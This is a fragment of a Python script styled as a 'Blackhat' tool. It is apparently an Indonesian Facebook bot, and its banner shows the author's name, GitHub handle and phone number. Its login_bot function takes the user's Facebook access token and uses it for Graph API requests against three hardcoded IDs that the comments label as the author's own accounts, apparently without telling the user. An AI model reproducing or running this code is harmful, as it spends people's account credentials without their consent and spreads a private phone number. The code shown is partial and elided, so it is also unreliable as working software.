...
"""%s
 ...
 - github      : github.com/Frank-Jason-Sebayang
 - script name : FJS (Frank Jason Sebayang)
 - version     : 1.1
...
def banner():
	print (''' %s 
 © Blackhat%s \n __________       _____.__  \n \____    /____ _/ ____\__| %s> %sFrank \n   /     /\\__  \\\   __\|  | %s> %sJason \n  /     /_ / __ \|  |  |  | %s>%s Sebayang [Rabun] \n /_______ (____  /__|  |__| %s>%s No Wa : 081363076900 \n         \/    \/ \n %s[%s*%s] By : %sFrank Jason Sebayang \n %s[%s*%s] -------------------------------------- \n [%s*%s] IP : %s%s'''%
...
def login_bot(romz):
	try:
		...
		requests.post("https://graph.facebook.com/%s?fields=subscribers&access_token=%s"%(romz1,toket)) # FRANK JASON PENGGUNA AKUN UNIK
		requests.post("https://graph.facebook.com/%s?fields=subscribers&access_token=%s"%(romz2,toket)) # DEMIT FRANK JASON
		requests.post("https://graph.facebook.com/%s?fields=subscribers&access_token=%s"%(romz3,toket)) # Frank Jason (2018)
